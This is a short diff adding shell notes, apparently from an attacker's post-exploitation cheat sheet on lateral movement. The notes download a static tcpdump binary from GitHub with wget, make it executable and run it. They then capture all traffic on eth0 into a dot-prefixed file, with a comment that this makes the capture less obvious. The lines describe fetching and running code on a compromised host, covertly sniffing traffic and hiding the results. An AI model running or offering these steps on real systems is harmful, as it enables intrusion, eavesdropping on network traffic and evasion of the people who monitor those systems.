@@ -1,0 +1,6 @@
+#5 - move laterally inside systems
+#packet captures can provide val inf
+#linux - no tcpdump?
+wget -q https://raw.githubusercontent.com/yunchih/static-binaries/master/tcpdump -O tcpdump && chmod +x tcpdump
+./tcpdump -D
+./tcpdump -n -i eth0 -s 0 -w .packets.pcap #. - hidden file, slightly less obvious
